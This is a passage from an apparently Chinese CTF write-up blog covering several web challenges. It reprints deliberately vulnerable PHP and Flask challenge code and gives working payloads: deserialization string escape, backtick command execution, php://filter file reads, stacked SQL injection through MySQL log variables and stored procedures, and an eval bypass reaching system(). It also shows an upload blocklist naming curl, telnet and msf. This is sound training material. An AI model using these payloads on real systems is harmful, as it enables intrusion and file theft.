class="string">"$a()?&gt;&amp;a=phpinfo</span></span><br></pre></td></tr></table></figure><h3 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h3><ul><li>反序列化逃逸</li><li>逃逸长度增加或减少</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化字符串逃逸，可以看这篇文章，增加和减少都有讲到</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p>需要注意增加或减少逃逸长度的思想，正常的 payload <code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;}</code>，长度为 29，然而每次逃逸的长度为 4，29 不是 4 的倍数。减少是不可能了，那么考虑增加，<code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;i:1}</code> 32 位，是 4 的倍数。</p><p>payload：<code>challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;i:1}</code></p><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><p>正则为 <code>/\(.*\)/</code>，不能使用带括号的 PHP 函数，那么考虑特殊语法 echo 和 include，回显结果不能含有 <code>flag</code>，base64 即可</p><p>payload1：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=echo`cat flag.php|base64`;</span><br></pre></td></tr></table></figure><p> payload2：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?a</span>=<span class="keyword">include</span> <span class="string">'php://filter/read=convert.base64-encode/resource=flag.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化数组即可，本地 payload 可以，题目环境不可以，发现 <code>==</code> 想到弱类型，flag.php 里面对变量肯定有改动，<code>username</code> 和 <code>password</code> 改为数字类型的 <code>0</code> 即可，（非得这么考弱类型吗……）</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">a:</span><span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"username"</span>;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;<span class="string">i:</span><span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><p>给了 index.php，登录 post 请求要改到 check.php，然后会跳转到 ping.php，然后都是假界面，index.php 注入然后 os-shell 搞定。</p><p>后面发现改了题，换成了命令执行绕过，过滤了空格，用 <code>%09</code> 绕过。又过滤了 <code>flag</code>，使用linux 通配符 <code>/????</code> 的方式 cat 到 flag</p><h3 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h3><p>qwb 随便注改编，三种思路可以参考</p><p><a href="https://www.jianshu.com/p/36f0772f5ce8" target="_blank" rel="noopener">https://www.jianshu.com/p/36f0772f5ce8</a></p><p>这里 <code>set..prepare</code> 过滤忽略了大小写，set 和 prepare 不能同时出现，那么换一种思路，使用系统变量。数据库没有东西，尝试写入shell，能写入，但是访问就403错误，猜测 ngnix 配置问题。然后尝试 load_file 读文件，读取到 <code>/tmp/flag.sh</code> 获取到 flag 路径（参照随便注的 dockerfile）为 <code>/fffllaagg</code>，读取即可。</p><p>这里有一个小 trick，我是使用的系统变量 <code>general_log_file</code> 来注入，但是发现 <code>select ... /etc/paswd</code> 这样sql语句和目录一起出现的语句不能赋值给 <code>general_log_file</code>，所以我用了两个系统变量，用预编译占位符的方式绕过。</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1';<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">"select load_file(?)"</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">"/fffllaagg"</span>;<span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"slow_query_log_file"</span>;<span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"general_log_file"</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @@slow_query_log_file;<span class="keyword">execute</span> execsql <span class="keyword">using</span> @@general_log_file;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>后来发现预期解是考察存储过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"1';</span></span><br><span class="line"><span class="string">    create procedure `qq`(out string text(1024), in hex text(1024))</span></span><br><span class="line"><span class="string">    BEGIN</span></span><br><span class="line"><span class="string">        SET string = hex;</span></span><br><span class="line"><span class="string">    END;</span></span><br><span class="line"><span class="string">    ;#"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($a).<span class="string">"\n"</span>;</span><br><span class="line">$b = <span class="string">"1';</span></span><br><span class="line"><span class="string">    call `qq`(@decoded, 0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460);</span></span><br><span class="line"><span class="string">    prepare payload from @decoded;</span></span><br><span class="line"><span class="string">    execute payload;</span></span><br><span class="line"><span class="string">    ;#"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT language=javascript&gt;&lt;!--</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runClock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">theTime = window.setTimeout(<span class="string">"runClock()"</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> Date();</span><br><span class="line"><span class="keyword">var</span> display= today.toLocaleString();</span><br><span class="line">window.status=<span class="string">""</span>+display+<span class="string">"黑客导航 － www.hac-ker.com"</span>;</span><br><span class="line">&#125;runClock();</span><br><span class="line"><span class="comment">//--&gt;</span></span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="footer-wrapper"&gt;</span><br><span class="line">            &lt;footer&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    error_reporting(<span class="number">0</span>);</span><br><span class="line">                    $action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">                            &#125;                           </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/footer&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- B4Z0-@:OCnDf, --&gt;</span><br></pre></td></tr></table></figure><p>fuzz 到 action 参数，发现文件包含漏洞，filter 伪协议读源码即可，过滤了 base，换用rot13编码</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="keyword">string</span>.rot13/resource=flag.php</span><br></pre></td></tr></table></figure><p>flag.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hex 解码后发现 1nD3x.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考 p 神文章，绕过 16 位限制</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /<span class="number">1</span>nD3x.php?<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=cat%<span class="number">20</span>/flag_mdnrvvldb&amp;<span class="number">2</span>=system HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">91</span>cd6671<span class="number">-4678</span><span class="number">-4</span>d49-b68f<span class="number">-2</span>cfa15e6aa9d.node3.hackingfor.fun</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span><span class="number">.4183</span><span class="number">.121</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=d774f57dd2bce55764577fa8151b806c11603020799</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 21</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">code=usort(...$_GET);</span></span><br></pre></td></tr></table></figure><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p>delctf 原题：<a href="https://blog.csdn.net/alexhcf/article/details/105946638" target="_blank" rel="noopener">https://blog.csdn.net/alexhcf/article/details/105946638</a></p><p>上传 .htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;UPLOAD&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"style/css/style1.css"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"style/css/style2.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">$typeAccepted = [<span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>];</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $black = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        $result1 =<span class="string">"???"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        $result1 =<span class="string">"filename cannot be empty!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">"/ph|ml|js|cg/i"</span>, $name)) &#123;</span><br><span class="line">        $result1 = <span class="string">"filename error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!in_array($_FILES[<span class="string">"fileUpload"</span>][<span class="string">'type'</span>], $typeAccepted)) &#123;</span><br><span class="line">        $result1 = <span class="string">'filetype error'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">"/perl|pyth|ph|auto|curl|\|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/i"</span>,$black))&#123;</span><br><span class="line">        $result1 = <span class="string">"perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">        move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">        system(<span class="string">"chmod +x "</span>.$userdir.<span class="string">"/*"</span>);</span><br><span class="line">        $result2= <span class="string">"Your dir : "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">        $result3= <span class="string">"Your files :"</span> .$name.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $result1 = <span class="string">'upload your file'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="wrap"&gt;</span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">        &lt;h1 style=<span class="string">"color: white; margin: 0; text-align: center"</span>&gt;UPLOADS&lt;/h1&gt;</span><br><span class="line">        &lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">        &lt;input class="wd" type="file" name="fileUpload" id="file"&gt;&lt;br&gt;</span><br><span class="line">        &lt;input class="wd" type="submit" name="upload" value="submit"&gt;</span><br><span class="line">            &lt;p class="change_link" style="text-align: center"&gt;</span><br><span class="line">            &lt;strong&gt;<span class="meta">&lt;?php</span> print_r($result1);<span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/br&gt;</span><br><span class="line">            &lt;strong&gt;<span class="meta">&lt;?php</span> print_r($result3);<span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/br&gt;</span><br><span class="line">            &lt;strong&gt;<span class="meta">&lt;?php</span> print_r($result2);<span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h3><p>这题人傻了，直接变成数组就可以绕过，考察的错误转换成true？</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?<span class="keyword">name</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="easy-flask2"><a href="#easy-flask2" class="headerlink" title="easy_flask2"></a>easy_flask2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect,request,session,make_response</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, is_admin)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.is_admin = is_admin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> 